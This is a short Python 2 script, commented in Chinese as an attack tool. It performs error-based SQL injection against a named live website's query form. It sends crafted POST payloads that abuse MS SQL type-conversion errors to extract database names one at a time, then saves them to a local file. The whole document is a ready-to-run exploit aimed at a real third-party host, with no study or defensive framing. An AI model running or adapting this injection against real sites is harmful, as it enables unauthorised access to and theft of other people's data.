#-*- coding:utf8 -*-
import sys
import requests
reload(sys)
sys.setdefaultencoding( "utf8" )
#攻击url
url='http://www.iuka.cn/chaxun'
#获取的数据库列表
db_names=['null']
i=0

f=open('C:\\Users\\lovebear96\\Desktop\\hackit\\data\\database.txt','w')

while True:
	#攻击语句
	con="123'/**/and/**/convert(int,(select/**/top/**/1/**/db_name("+str(i)+")))=0-- "
	i=i+1
	data={
		'con':con,
		'act':'cha'
	}
	r=requests.post(url,data=data) 
	#信息提取
	text=r.content.decode('gbk')
	start=text.find(u'值')
	end=text.find(u'转换')
	new_db=str(text[start+3:end-2])
	if new_db=='' or end==-1:
		break
	db_names.append(new_db)
	start+=len(new_db)+3
f.write(str(db_names[1:-1]))
f.close()